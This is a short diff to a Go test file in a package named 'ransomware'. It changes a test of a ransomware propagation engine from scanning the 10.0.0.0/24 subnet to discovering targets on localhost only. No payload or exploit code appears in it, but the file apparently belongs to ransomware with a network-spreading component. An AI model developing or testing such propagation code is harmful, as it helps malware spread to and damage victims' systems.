@@ -1,7 +1,6 @@
 package ransomware
 
 import (
-	"context"
 	"testing"
 )
 
@@ -16,11 +15,10 @@ func TestNewPropagationEngine(t *testing.T) {
 func TestPropagationEngineInit(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	p := NewPropagationEngine(cfg)
-	ctx := context.Background()
 
-	targets := p.ScanNetwork(ctx, "10.0.0.0/24")
+	targets := p.DiscoverTargets("127.0.0.1/32", nil)
 	if len(targets) == 0 {
-		t.Log("ScanNetwork returned 0 targets (expected in test env)")
+		t.Log("DiscoverTargets returned 0 targets (expected in test env)")
 	}
 }
 
